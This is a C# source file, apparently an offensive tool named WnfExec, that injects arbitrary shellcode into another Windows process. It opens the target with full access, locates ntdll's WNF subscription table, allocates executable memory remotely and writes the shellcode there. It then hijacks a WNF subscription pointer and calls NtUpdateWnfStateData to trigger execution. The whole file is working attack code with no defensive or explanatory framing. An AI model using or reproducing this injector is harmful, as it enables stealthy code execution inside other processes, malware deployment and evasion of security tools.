using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace WnfExec
{
    public class WNF
    {
        public byte[] Shellcode { get; set; }

        public WNF(byte[] shellcode)
        {
            Shellcode = shellcode;
        }

        public void InjectProcess(string process)
        {
            var pid = Process.GetProcessesByName(process).FirstOrDefault().Id;
            InjectProcess(pid);
        }

        public void InjectProcess(int processId)
        {
            var handle = OpenProcess(0x1f0fff, false, processId);
            var ntdllHandle = GetModuleHandle("ntdll.dll");
            var peStartOffset = IntPtr.Add(ntdllHandle, 0x3c);
            var peSignature = Marshal.ReadInt32(peStartOffset);
            var sectionOffset = IntPtr.Add(ntdllHandle, peSignature);
            var sectionCount = Marshal.ReadInt16(IntPtr.Add(sectionOffset, 0x6));
            var sectionHeaderSize = Marshal.ReadInt16(IntPtr.Add(sectionOffset, 0x14));
            var sectionTable = IntPtr.Add(sectionOffset, 0x18 + sectionHeaderSize);
            var rva = int.MinValue;
            var isLoaded = false;

            for (var currentCount = 0; currentCount < sectionCount; currentCount++)
            {
                var addressOfEntryPoint = IntPtr.Add(sectionTable, (currentCount * 0x28));
                var imageSectionheader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(addressOfEntryPoint, typeof(IMAGE_SECTION_HEADER));
                if ((imageSectionheader.Characteristics & 0x80000000) == 0x80000000)
                {
                    var imageOffset = IntPtr.Add(ntdllHandle, (int)imageSectionheader.VirtualAddress);
                    var mbi = new MEMORY_BASIC_INFORMATION();
                    for (int sectionVirtualCount = 0; sectionVirtualCount < imageSectionheader.VirtualSize; sectionVirtualCount += IntPtr.Size)
                    {
                        var probeBase = IntPtr.Add(imageOffset, sectionVirtualCount);
                        int CallRes = VirtualQuery(Marshal.ReadIntPtr(probeBase), ref mbi, Marshal.SizeOf(mbi));
                        if (CallRes == Marshal.SizeOf(mbi))
                        {
                            if (mbi.State == 0x1000 && mbi.Type == 0x20000 && mbi.Protect == 0x4)
                            {
                                int nodeType = Marshal.ReadInt16(Marshal.ReadIntPtr(probeBase));
                                int nodeSize = Marshal.ReadInt16(IntPtr.Add(Marshal.ReadIntPtr(probeBase), 2));
                                var wnfSize = Marshal.SizeOf(typeof(WNF_SUBSCRIPTION_TABLE));
                                if (nodeType == 0x911 && nodeSize == wnfSize)
                                {
                                    rva = ((int)imageSectionheader.VirtualAddress + sectionVirtualCount);
                                    isLoaded = true;
                                    break;
                                }
                            }
                        }
                    }
                }
                if (isLoaded) { break; }
            }

            var subscription_table = new WNF_SUBSCRIPTION_TABLE();
            var ntbase = IntPtr.Zero;
            var bytesRead = (uint)0;

            foreach (ProcessModule module in Process.GetProcessById(processId).Modules)
                if (module.FileName.Contains("\\ntdll.dll"))
                    ntbase = module.BaseAddress;

            var remotePtr = Marshal.AllocHGlobal(Marshal.SizeOf(IntPtr.Size));
            var remoteSubPtr = Marshal.AllocHGlobal(Marshal.SizeOf(subscription_table));

            ReadProcessMemory(handle, IntPtr.Add(ntbase, rva), remotePtr, (uint)IntPtr.Size, ref bytesRead);
            Marshal.ReadIntPtr(remotePtr);
            bytesRead = 0;
            ReadProcessMemory(handle, Marshal.ReadIntPtr(remotePtr), remoteSubPtr, (uint)Marshal.SizeOf(subscription_table), ref bytesRead);

            var tblCheck = (WNF_SUBSCRIPTION_TABLE)Marshal.PtrToStructure(remoteSubPtr, typeof(WNF_SUBSCRIPTION_TABLE));
            if (
                tblCheck.Header.NodeTypeCode == 0x911 &&
                tblCheck.Header.NodeByteSize == Marshal.SizeOf(typeof(WNF_SUBSCRIPTION_TABLE))
            )
            {
                subscription_table = tblCheck;
            }

            var subscriptions = new List<WNF_SUBSCRIPTION_SET>();
            while (true)
            {
                var name_subscription_pointer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WNF_NAME_SUBSCRIPTION)));
                bytesRead = 0;
                if (!ReadProcessMemory(handle,
                    IntPtr.Subtract(subscription_table.NamesTableEntry.Flink, (int)Marshal.OffsetOf(typeof(WNF_NAME_SUBSCRIPTION), "NamesTableEntry")),
                    name_subscription_pointer, (uint)Marshal.SizeOf(typeof(WNF_NAME_SUBSCRIPTION)), ref bytesRead
                )) { break; }

                var name_subscription = (WNF_NAME_SUBSCRIPTION)Marshal.PtrToStructure(name_subscription_pointer, typeof(WNF_NAME_SUBSCRIPTION));
                var sub_id = name_subscription.SubscriptionId;
                var state_name = name_subscription.StateName;

                var user_subscription_flink = name_subscription.SubscriptionsListHead.Flink;
                var user_subscription_blink = name_subscription.SubscriptionsListHead.Blink;
                var subscription_callbacks = new List<SUBSCRIPTION_CALLBACK>();

                while (true)
                {
                    var user_subscription_alloc = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WNF_USER_SUBSCRIPTION)));
                    bytesRead = 0;
                    if (!ReadProcessMemory(handle,
                        IntPtr.Subtract(user_subscription_flink, (int)Marshal.OffsetOf(typeof(WNF_USER_SUBSCRIPTION), "SubscriptionsListEntry")),
                        user_subscription_alloc, (uint)Marshal.SizeOf(typeof(WNF_USER_SUBSCRIPTION)), ref bytesRead
                    )) { break; }

                    var user_subscription = (WNF_USER_SUBSCRIPTION)Marshal.PtrToStructure(user_subscription_alloc, typeof(WNF_USER_SUBSCRIPTION));

                    subscription_callbacks.Add(new SUBSCRIPTION_CALLBACK()
                    {
                        UserSubscription = user_subscription_flink,
                        CallBack = user_subscription.Callback,
                        Context = user_subscription.CallbackContext
                    });

                    if (user_subscription_flink == user_subscription_blink)
                        break;
                    else
                        user_subscription_flink = user_subscription.SubscriptionsListEntry.Flink;
                }
                subscriptions.Add(new WNF_SUBSCRIPTION_SET()
                {
                    SubscriptionId = name_subscription.SubscriptionId,
                    StateName = name_subscription.StateName,
                    UserSubs = subscription_callbacks
                });

                if (subscription_table.NamesTableEntry.Flink == subscription_table.NamesTableEntry.Blink)
                    break;
                else
                    subscription_table.NamesTableEntry.Flink = name_subscription.NamesTableEntry.Flink;
            }
            var subscription = subscriptions.FirstOrDefault(x => x.StateName == 0xd83063ea3bc1875);
            var shellcodePointer = VirtualAllocEx(handle, IntPtr.Zero, (uint)Shellcode.Length, 0x3000, 0x40);
            var bytesWritten = (uint)0;
            if (!WriteProcessMemory(handle, shellcodePointer, Shellcode, (uint)Shellcode.Length, ref bytesWritten))
                VirtualFreeEx(handle, shellcodePointer, 0, 0x8000);
            bytesWritten = 0;

            var guid = new Guid();
            var first_subscription = subscription.UserSubs.FirstOrDefault();

            var shellcodePointerBytes = BitConverter.GetBytes((UInt64)shellcodePointer);
            WriteProcessMemory(handle,
                IntPtr.Add(first_subscription.UserSubscription, (int)Marshal.OffsetOf(typeof(WNF_USER_SUBSCRIPTION), "NameSubscription")),
                shellcodePointerBytes, (uint)shellcodePointerBytes.Length, ref bytesWritten
            );
            NtUpdateWnfStateData(ref subscription.StateName, IntPtr.Zero, 0, guid, IntPtr.Zero, 0, false);
        }


        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
            public string Name;
            public UInt32 VirtualSize;
            public UInt32 VirtualAddress;
            public UInt32 SizeOfRawData;
            public UInt32 PointerToRawData;
            public UInt32 PointerToRelocations;
            public UInt32 PointerToLinenumbers;
            public UInt16 NumberOfRelocations;
            public UInt16 NumberOfLinenumbers;
            public Int32 Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public UIntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WNF_SUBSCRIPTION_TABLE
        {
            public WNF_CONTEXT_HEADER Header;
            public IntPtr NamesTableLock;
            public LIST_ENTRY NamesTableEntry;
            public LIST_ENTRY SerializationGroupListHead;
            public IntPtr SerializationGroupLock;
            public UInt64 Unknown1;
            public UInt32 SubscribedEventSet;
            public UInt64 Unknown2;
            public IntPtr Timer;
            public UInt64 TimerDueTime;
        }

        public struct WNF_CONTEXT_HEADER
        {
            public UInt16 NodeTypeCode;
            public UInt16 NodeByteSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WNF_USER_SUBSCRIPTION
        {
            public WNF_CONTEXT_HEADER Header;
            public LIST_ENTRY SubscriptionsListEntry;
            public IntPtr NameSubscription;
            public IntPtr Callback;
            public IntPtr CallbackContext;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SUBSCRIPTION_CALLBACK
        {
            public IntPtr UserSubscription;
            public IntPtr CallBack;
            public IntPtr Context;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WNF_SUBSCRIPTION_SET
        {
            public UInt64 SubscriptionId;
            public ulong StateName;
            public List<SUBSCRIPTION_CALLBACK> UserSubs;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WNF_NAME_SUBSCRIPTION
        {
            public WNF_CONTEXT_HEADER Header;
            public UInt64 SubscriptionId;
            public UInt64 StateName;
            public IntPtr CurrentChangeStamp;
            public LIST_ENTRY NamesTableEntry;
            public IntPtr TypeId;
            public IntPtr SubscriptionLock;
            public LIST_ENTRY SubscriptionsListHead;
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string module);

        [DllImport("kernel32.dll")]
        public static extern int VirtualQuery(IntPtr address, ref MEMORY_BASIC_INFORMATION buffer, int len);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(UInt32 access, bool inheritHandle, int pid);

        [DllImport("kernel32.dll")]
        public static extern Boolean ReadProcessMemory(IntPtr handle, IntPtr address, IntPtr buffer, UInt32 size, ref UInt32 bytesRead);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr handle, IntPtr address, uint size, int allocType, int protect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr handle, IntPtr address, byte[] buffer, uint size, ref UInt32 bytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern bool VirtualFreeEx(IntPtr handle, IntPtr address, UInt32 size, UInt32 freeType);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtUpdateWnfStateData(
            ref ulong state, IntPtr buffer, int len, [In, Optional] Guid typeid, [Optional] IntPtr scope,
            int matchChangeStamp, [MarshalAs(UnmanagedType.Bool)] bool checkChangeStamp
        );
    }
}
